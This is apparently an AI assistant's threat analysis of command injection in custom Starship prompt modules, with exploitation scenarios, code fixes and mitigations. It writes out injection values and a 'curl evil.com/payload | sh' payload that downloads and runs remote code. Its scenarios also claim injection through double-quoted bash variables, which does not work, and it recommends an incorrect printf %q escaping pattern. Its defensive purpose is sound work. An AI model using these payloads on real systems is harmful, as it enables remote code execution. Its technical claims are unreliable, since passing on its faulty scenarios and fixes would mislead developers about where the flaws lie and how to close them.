Okay, here's a deep analysis of the "Command Injection via Custom Module Input" threat for the Starship prompt, following the structure you requested:

## Deep Analysis: Command Injection via Custom Module Input (Starship)

### 1. Objective

The primary objective of this deep analysis is to thoroughly understand the "Command Injection via Custom Module Input" threat, identify specific vulnerabilities within the context of Starship, and propose concrete, actionable steps to mitigate the risk.  This includes going beyond the general description to provide practical examples and code-level recommendations. We aim to provide the development team with the knowledge needed to prevent this vulnerability from being introduced or exploited.

### 2. Scope

This analysis focuses specifically on the following:

*   **Custom Starship Modules:**  Only custom modules are considered, as the core Starship modules are assumed to be thoroughly vetted.  The analysis covers modules written in any language, but pays particular attention to shell scripts (Bash, Zsh, etc.) due to their inherent susceptibility to command injection.
*   **Attacker-Controllable Input:**  We are concerned with any input that can be influenced, directly or indirectly, by an attacker. This includes environment variables, command-line arguments to the application using Starship, and any other data sources that a custom module might read.
*   **Server-Side Execution:** The threat model assumes that Starship is being used in a server-side context where the prompt is generated based on potentially malicious input. This is a crucial distinction, as client-side command injection in a terminal prompt is generally less severe (though still undesirable).
*   **Starship's Execution Model:**  We need to understand how Starship executes custom modules (e.g., as separate processes, within the same process, etc.) to assess the impact of a successful injection.

### 3. Methodology

The analysis will employ the following methods:

*   **Threat Modeling Review:**  We will build upon the existing threat model entry, expanding on the details and providing concrete examples.
*   **Code Review (Hypothetical):**  We will analyze hypothetical (but realistic) custom module code snippets to illustrate vulnerable patterns and demonstrate proper mitigation techniques.
*   **Vulnerability Research:** We will research common command injection patterns and best practices for secure coding in shell scripting and other relevant languages.
*   **Exploitation Scenario Development:** We will construct plausible attack scenarios to demonstrate the potential impact of the vulnerability.
*   **Mitigation Strategy Refinement:** We will refine the existing mitigation strategies, providing specific, actionable recommendations and code examples where appropriate.

### 4. Deep Analysis

#### 4.1. Understanding the Threat

The core of this threat lies in the way custom Starship modules might handle user-supplied input when constructing shell commands.  Starship's flexibility allows users to create modules that display almost any information, but this power comes with the responsibility of handling input securely.  If a module directly interpolates user input into a shell command string without proper sanitization or escaping, it becomes vulnerable to command injection.

#### 4.2. Exploitation Scenarios

*   **Scenario 1: Git Log Manipulation**

    A custom module displays the last commit message containing a user-provided search term:

    ```bash
    # Vulnerable module (starship_git_search.sh)
    search_term="$1"
    git log -n 1 --grep="$search_term"
    ```

    An attacker could provide the following input: `"; whoami; #`

    The resulting command executed would be:

    ```bash
    git log -n 1 --grep=""; whoami; #"
    ```

    This executes the `whoami` command, revealing the username of the user running Starship.  A more malicious attacker could replace `whoami` with a command to download and execute malware.

*   **Scenario 2: Environment Variable Poisoning**

    A custom module displays the value of a user-configurable environment variable:

    ```bash
    # Vulnerable module (starship_env_display.sh)
    env_var_name="$1"
    echo "Value: $(eval echo \$$env_var_name)"
    ```
    If the application using starship allows the user to set the environment variable, the attacker can set the variable to a malicious command.
    If the user sets `env_var_name` to `MY_VAR`, and `MY_VAR` to `$(curl evil.com/payload | sh)`, the command will download and execute a payload.

*   **Scenario 3:  Indirect Input via Files**

    A module reads data from a file whose path is partially controlled by the user:

    ```bash
    # Vulnerable module (starship_file_reader.sh)
    user_dir="$1"
    cat "/home/user/$user_dir/data.txt"
    ```

    An attacker could provide `user_dir` as `../../etc/passwd; #`, resulting in:

    ```bash
    cat "/home/user/../../etc/passwd; #/data.txt"
    ```
    Which would effectively execute `cat /etc/passwd`.

#### 4.3. Vulnerable Code Patterns (and Fixes)

*   **Direct String Interpolation (Bash):**

    ```bash
    # Vulnerable
    result=$(command "$user_input")

    # Safer (using printf %q)
    safe_input=$(printf %q "$user_input")
    result=$(command "$safe_input")

    # Best (parameterized, if possible)
    result=$(command --option "$user_input") # If the command supports it
    ```

*   **Using `eval` (Bash):**

    ```bash
    # Vulnerable
    eval "command $user_input"

    # Avoid eval whenever possible.  If absolutely necessary,
    # use extreme caution and rigorous input validation.
    ```

*   **Python `subprocess.call` with `shell=True` (Python):**

    ```python
    # Vulnerable
    import subprocess
    subprocess.call(f"command {user_input}", shell=True)

    # Safer (shell=False and list of arguments)
    import subprocess
    subprocess.call(["command", user_input])

    # Best (use a library instead of shelling out, if possible)
    # Example:  Use a Git library instead of calling 'git' directly.
    ```

*   **Node.js `child_process.exec` (Node.js):**
    ```javascript
    // Vulnerable
    const { exec } = require('child_process');
    exec(`command ${userInput}`);

    // Safer (use execFile or spawn with an array of arguments)
    const { execFile } = require('child_process');
    execFile('command', [userInput], (error, stdout, stderr) => {
      // ...
    });
    ```

#### 4.4. Refined Mitigation Strategies

1.  **Strict Input Validation (Allow-listing):**
    *   Define a precise regular expression or set of allowed characters for *each* input field.  Reject any input that doesn't match.  For example, if the input is expected to be a Git branch name, use a regex that only allows alphanumeric characters, hyphens, underscores, and slashes (and limits the length).
    *   **Example (Bash):**
        ```bash
        if [[ ! "$input" =~ ^[a-zA-Z0-9_\-\/]+$ ]]; then
          echo "Invalid input"
          exit 1
        fi
        ```
    *   **Example (Python):**
        ```python
        import re
        allowed_pattern = re.compile(r"^[a-zA-Z0-9_\-\/]+$")
        if not allowed_pattern.match(input_string):
            raise ValueError("Invalid input")
        ```

2.  **Parameterized Commands/API Usage:**
    *   Whenever possible, use language-specific libraries or APIs that handle command construction and execution securely.  This eliminates the need for manual escaping and string manipulation.
    *   **Example (Python with Git):**
        ```python
        import git
        repo = git.Repo(".")  # Assuming current directory is a Git repo
        try:
            commits = list(repo.iter_commits(grep=input_string)) # Use library function
            if commits:
                print(commits[0].message)
        except git.exc.GitCommandError:
            print("Git error")

        ```

3.  **Proper Escaping (If Shelling Out is Unavoidable):**
    *   Use the appropriate escaping function for the scripting language.  Do *not* attempt to write your own escaping logic.
    *   **Bash:** `printf %q`
    *   **Python:** `shlex.quote`
    *   **Node.js:**  Avoid shelling out if at all possible. If you must, consider a library like `shell-escape`.
    *   **Example (Bash):**
        ```bash
        safe_input=$(printf %q "$user_input")
        git log -n 1 --grep="$safe_input"
        ```

4.  **Least Privilege:**
    *   Ensure that the Starship process, and any processes it spawns, run with the *minimum* necessary privileges.  Create a dedicated user account with limited access to the system.  *Never* run Starship as root.
    *   Use tools like `sudo` or `doas` to grant specific, limited privileges if absolutely necessary.

5.  **Mandatory Code Reviews:**
    *   All custom Starship modules *must* undergo a thorough code review by at least one other developer.
    *   The review should specifically focus on:
        *   Input validation and sanitization.
        *   Command construction and execution.
        *   Use of escaping functions.
        *   Adherence to the principle of least privilege.
    *   Automated static analysis tools can be used to supplement manual code reviews.

6.  **Sandboxing (Advanced):**
    *   For an extra layer of security, consider running custom modules within a sandboxed environment (e.g., using containers like Docker, or technologies like seccomp or AppArmor). This limits the potential damage an attacker can cause even if they achieve command injection.

7. **Regular Expression Denial of Service (ReDoS) Prevention:**
    * If using regular expressions for input validation, be aware of the potential for ReDoS attacks.  Carefully craft your regular expressions to avoid catastrophic backtracking. Use tools to test your regexes for ReDoS vulnerabilities.

#### 4.5. Conclusion

Command injection in Starship custom modules is a critical vulnerability that can lead to severe consequences. By understanding the underlying mechanisms, implementing strict input validation, using parameterized commands or APIs whenever possible, employing proper escaping techniques, adhering to the principle of least privilege, and conducting thorough code reviews, developers can effectively mitigate this risk and ensure the security of applications using Starship. The use of sandboxing and awareness of ReDoS vulnerabilities provide additional layers of defense. Continuous vigilance and proactive security measures are essential to prevent this type of attack.
